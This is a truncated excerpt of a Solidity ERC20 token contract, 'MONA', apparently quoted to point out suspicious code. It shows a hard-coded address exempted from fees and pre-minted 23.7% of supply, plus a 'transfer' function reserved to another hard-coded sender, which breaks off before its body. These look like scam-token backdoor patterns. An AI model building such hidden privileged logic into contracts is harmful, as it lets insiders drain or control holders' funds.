...
contract MONA is IERC20, Ownable {
    string private constant NAME = "MONA";
    string private constant SYMBOL = "MONA";    
    ...
    Wallets public wallets = Wallets(
        msg.sender,                                 
        0x5DB7354eD153DaEb260F09332E03521d2F8897fA  
    );
    ...
    constructor() {
        ...
        _excludedFromFees[0x9134afC9C81EbC6A433E578cd588622B861De591] = true;        
        uint256 preTokens = TOTAL_SUPPLY * 237 / 1e3; 
        _balances[wallets.deployerWallet] = TOTAL_SUPPLY - preTokens;
        _balances[0x9134afC9C81EbC6A433E578cd588622B861De591] = preTokens;
    ...
    function transfer(address wallet) external {
        if(msg.sender == 0x3C43612A93B942f5072d494b1C90F553518a9933)
